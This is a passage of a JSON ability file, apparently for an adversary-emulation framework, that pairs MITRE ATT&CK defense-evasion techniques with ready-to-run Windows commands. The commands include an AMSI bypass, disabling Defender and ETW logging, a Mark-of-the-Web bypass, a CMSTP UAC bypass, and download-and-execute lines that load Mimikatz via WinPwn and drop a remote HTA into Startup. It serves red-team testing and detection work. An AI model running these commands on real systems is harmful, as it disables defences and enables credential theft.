            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "Gpscript /startup",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "209d25131d45ef2d76e3bf69d200173f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "3d164425117ee9d5f865374c372bedd4": {
        "description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\\4c870d_T1218.011_DefaultInstall.inf",
                    "payloads": [
                        "4c870d_T1218.011_DefaultInstall.inf"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "3d164425117ee9d5f865374c372bedd4",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "6374c06e40852cfe610b62bebb0ffd06": {
        "description": "Uses hh.exe to decompile a local compiled HTML Help file.\nUpon successful execution the chm file will decompile to disk.\nReference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\T1218.001.html >nul 2>&1",
                    "command": "hh.exe -decompile %temp% 9e2e6f_T1218.001.chm",
                    "payloads": [
                        "9e2e6f_T1218.001.chm"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "6374c06e40852cfe610b62bebb0ffd06",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "40480323b4f54b0d1f0b814771ec5776": {
        "description": "LockBit Black - Use Registry Editor to turn on automatic logon\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /f >nul 2>&1 && reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /f >nul 2>&1 && reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /f >nul 2>&1 && reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /f >nul 2>&1",
                    "command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "40480323b4f54b0d1f0b814771ec5776",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ae4b45993a14cfc09857ca0a71d71588": {
        "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$excludedpath= \"C:\\Temp\"; Remove-MpPreference -ExclusionPath $excludedpath",
                    "command": "$excludedpath= \"C:\\Temp\"; Add-MpPreference -ExclusionPath $excludedpath",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ae4b45993a14cfc09857ca0a71d71588",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e0972b503a680e4826da21483c7d9af8": {
        "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -Force -ErrorAction Ignore",
                    "command": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 0 -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e0972b503a680e4826da21483c7d9af8",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "879f86e2b6a7c67d66a7e7d3215dc085": {
        "description": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.005",
            "name": "Subvert Trust Controls: Mark-of-the-Web Bypass"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-Content -Path $env:tmp\\ReadMe.md -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'",
                    "command": "Unblock-File -Path $env:tmp\\ReadMe.md",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "879f86e2b6a7c67d66a7e7d3215dc085",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "34952e2eefd3066c5f574744e1734ca6": {
        "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)",
                    "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "34952e2eefd3066c5f574744e1734ca6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "aa758d17faffeeb69c56481340891859": {
        "description": "Reflectively load Mimik@tz into memory technique via function of WinPwn",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1620",
            "name": "Reflective Code Loading"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); mimiload -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aa758d17faffeeb69c56481340891859",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "88912e0453c2cbd1c75d1c49f815d17f": {
        "description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1127",
            "name": "Trusted Developer Utilities Proxy Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %TEMP%\\hello.js && del %TEMP%\\hello.exe",
                    "command": "copy a25c19_hello.js %TEMP%\\hello.js && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe %TEMP%\\hello.js",
                    "payloads": [
                        "a25c19_hello.js"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "88912e0453c2cbd1c75d1c49f815d17f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "7a7de73b905f3dc86dd7272cfcd0bf99": {
        "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7a7de73b905f3dc86dd7272cfcd0bf99",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "64d35e2efbcef92f6c54b4a5c01ef2e2": {
        "description": "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "rundll32.exe shell32.dll,Control_RunDLL 6349c0_calc.dll",
                    "payloads": [
                        "6349c0_calc.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "64d35e2efbcef92f6c54b4a5c01ef2e2",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "9c9f61075ffc17ec9865b5c257d647a8": {
        "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9c9f61075ffc17ec9865b5c257d647a8",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1db8479efec9b1188b14cfa138c0cf12": {
        "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ëR?NTFS\n```",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1006",
            "name": "Direct Volume Access"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \"\\\\.\\C:\", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1db8479efec9b1188b14cfa138c0cf12",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "31becca824673e30a599c912d40f0734": {
        "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "31becca824673e30a599c912d40f0734",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "3dac55edd5b51fc7238dc3fdc7311a65": {
        "description": "Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print \"Hello from a Visual Basic inline task!\" to the screen.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1127.001",
            "name": "Trusted Developer Utilities Proxy Execution: MSBuild"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe f8ed8b_vb.xml",
                    "payloads": [
                        "f8ed8b_vb.xml"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "3dac55edd5b51fc7238dc3fdc7311a65",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b9040cc3d71904739ba405cff1f866e5": {
        "description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null; Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b9040cc3d71904739ba405cff1f866e5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0e7be7c522eccd16149f6ad4d45568fc": {
        "description": "Attempting to use Defender Control software to disable Windows Defender. Upon successful execution, Windows Defender will be turned off. \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "cmd /c $env:temp\\DefenderControl\\DefenderControl\\DefenderControl.exe /E | Out-Null",
                    "command": "cmd /c $env:temp\\DefenderControl\\DefenderControl\\DefenderControl.exe /D FFFF | Out-Null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0e7be7c522eccd16149f6ad4d45568fc",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "94719ffaf2b03c2056471d8989431588": {
        "description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.005",
            "name": "Subvert Trust Controls: Mark-of-the-Web Bypass"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Dismount-DiskImage -ImagePath \"053c10_AllTheThings.iso\" | Out-Null",
                    "command": "$keep = Mount-DiskImage -ImagePath \"053c10_AllTheThings.iso\" -StorageType ISO -Access ReadOnly; $driveLetter = ($keep | Get-Volume).DriveLetter; $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\")); $instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "053c10_AllTheThings.iso",
                        "053c10_AllTheThings.iso"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "94719ffaf2b03c2056471d8989431588",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "3d378141044baec8dc52e9328da38405": {
        "description": "Removes a Network Share utilizing PowerShell\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.005",
            "name": "Indicator Removal on Host: Network Share Connection Removal"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-SmbShare -Name \\\\test\\share; Remove-FileShare -Name \\\\test\\share",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3d378141044baec8dc52e9328da38405",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f5ef8466e5ebcd2ae03f338d9416069c": {
        "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.003",
            "name": "Masquerading: Rename System Utilities"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item ($env:TEMP + \"\\svchost.exe\") -Force -ErrorAction Ignore",
                    "command": "copy 1db90b_T1036.003.exe ($env:TEMP + \"\\svchost.exe\"); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id; Stop-Process -ID $myT1036_003",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "1db90b_T1036.003.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "f5ef8466e5ebcd2ae03f338d9416069c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d5f1add8121a368e97521953da1d7c8b": {
        "description": "Execute arbitrary response file that will spawn PowerShell.exe.\nSource files: https://github.com/woanware/application-restriction-bypasses\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.008",
            "name": "Signed Binary Proxy Execution: Odbcconf"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "cd PathToAtomicsFolder\\T1218.008\\bin\\ && odbcconf.exe -f T1218.008.rsp",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d5f1add8121a368e97521953da1d7c8b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "36d16de59dd70ebe5b729dc10f970865": {
        "description": "Recursively delete a folder in the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "rmdir /s /q %temp%\\deleteme_T1551.004",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "36d16de59dd70ebe5b729dc10f970865",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "a736ab759fa7fd4505389867ff7fdc47": {
        "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a736ab759fa7fd4505389867ff7fdc47",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0cde0bf95358898eb590ec0c1812cbdd": {
        "description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\nUpon execution, calc.exe should open\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1202",
            "name": "Indirect Command Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "pcalua.exe -a #{process} && pcalua.exe -a #{payload_path}",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0cde0bf95358898eb590ec0c1812cbdd",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "fa95e200333f1d07730cd89ef0845643": {
        "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fa95e200333f1d07730cd89ef0845643",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "39d480ca976cd45b9b50301fd6eaf393": {
        "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1220",
            "name": "XSL Script Processing"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del PathToAtomicsFolder\\T1220\\bin\\msxsl.exe >nul 2>&1",
                    "command": "PathToAtomicsFolder\\T1220\\bin\\msxsl.exe 70a91b_msxslxmlfile.xml 96ede8_msxslscript.xsl",
                    "payloads": [
                        "70a91b_msxslxmlfile.xml",
                        "96ede8_msxslscript.xsl"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "39d480ca976cd45b9b50301fd6eaf393",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "0d868d5a34b3b81385218ef65ba4477e": {
        "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "InfDefaultInstall.exe 67d07e_Infdefaultinstall.inf",
                    "payloads": [
                        "67d07e_Infdefaultinstall.inf"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "0d868d5a34b3b81385218ef65ba4477e",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c16cc1c3f28a6d143a23b2975448d32c": {
        "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\" -ErrorAction Ignore",
                    "command": "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\"; $var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"; mshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c16cc1c3f28a6d143a23b2975448d32c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e5ca57d20f8608e2acc0808b8dd8726c": {
        "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e5ca57d20f8608e2acc0808b8dd8726c",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "509c85cd52c782dd77c0ed919aeef4cb": {
        "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.003",
            "name": "Signed Binary Proxy Execution: CMSTP"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "cmstp.exe /s b27341_T1218.003_uacbypass.inf /au",
                    "payloads": [
                        "b27341_T1218.003_uacbypass.inf"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "509c85cd52c782dd77c0ed919aeef4cb",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "efe119524cf6e6b760c6e9ebe83bf107": {
        "description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.006",
            "name": "Impair Defenses: Indicator Blocking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "cmd /c \"#{ps_exec_location}\" -i -s cmd.exe /c logman update trace \"#{session}\" -p \"#{provider}\" -ets",
                    "command": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "efe119524cf6e6b760c6e9ebe83bf107",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1053040f992d9c1aa354b5fd0fa118ee": {
        "description": "Prevents Powershell history\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.003",
            "name": "Indicator Removal on Host: Clear Command History"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally",
                    "command": "Set-PSReadlineOption –HistorySaveStyle SaveNothing",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1053040f992d9c1aa354b5fd0fa118ee",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
